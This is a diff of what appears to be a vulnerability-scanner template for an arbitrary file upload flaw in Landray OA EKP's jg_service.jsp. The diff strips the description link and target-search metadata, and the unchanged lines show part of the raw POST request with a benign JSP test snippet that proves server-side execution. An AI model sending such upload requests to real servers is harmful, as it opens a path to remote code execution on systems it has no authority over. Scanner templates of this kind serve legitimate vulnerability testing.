@@ -3,12 +3,8 @@ info:
   name: 蓝凌OA EKP jg_service任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ssgilynv2cggbqq3'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ssgilynv2cggbqq3
-    fofa: hunter：app.name="Landray 蓝凌OA"
 http:
 - raw:
   - 'POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1
@@ -39,8 +35,6 @@ http:
 
 
     DIRECTORY=
-
-
 
 
     <% out.println(111*11);%>
